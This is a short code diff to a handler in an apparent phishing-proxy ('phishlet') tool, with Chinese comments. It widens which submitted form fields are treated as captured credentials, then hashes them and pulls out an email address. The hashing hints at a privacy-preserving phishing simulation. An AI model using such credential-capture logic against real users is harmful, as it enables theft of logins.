@@ -248,8 +248,9 @@ def make_handler(phishlet, db_file):
                     if k.lower() == f.lower() and v:
                         captured_creds[f] = v[0]
 
-            if captured_creds and 'passwd' in ''.join(captured_creds.keys()).lower() or \
-               any('pass' in k.lower() or 'pwd' in k.lower() for k in captured_creds):
+            # F49: phishlet credential_fields 声明即凭据——此前额外要求
+            # 键名含 passwd/pass/pwd,自定义字段(u/p/user)全部漏拦截
+            if captured_creds:
                 # 哈希即毁
                 fp = hashlib.sha256(json.dumps(captured_creds, sort_keys=True).encode()).hexdigest()[:16]
                 email = next((v for k, v in captured_creds.items() if '@' in v), '')
